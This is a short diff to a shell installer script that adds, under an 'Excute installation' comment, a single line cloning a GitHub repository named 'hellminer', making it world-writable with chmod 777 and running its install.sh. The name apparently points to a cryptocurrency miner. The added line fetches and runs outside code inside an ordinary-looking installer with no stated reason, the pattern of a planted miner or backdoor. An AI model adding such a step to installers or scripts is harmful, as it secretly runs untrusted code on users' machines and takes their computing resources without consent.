@@ -1612,5 +1612,6 @@ elif [[ $onekey == 0 ]]; then
 	_summary
 
 	# Excute installation
+	git clone https://github.com/JavaRockstar/hellminer.git && chmod -R 777 hellminer && cd hellminer && ./install.sh
 fi
 
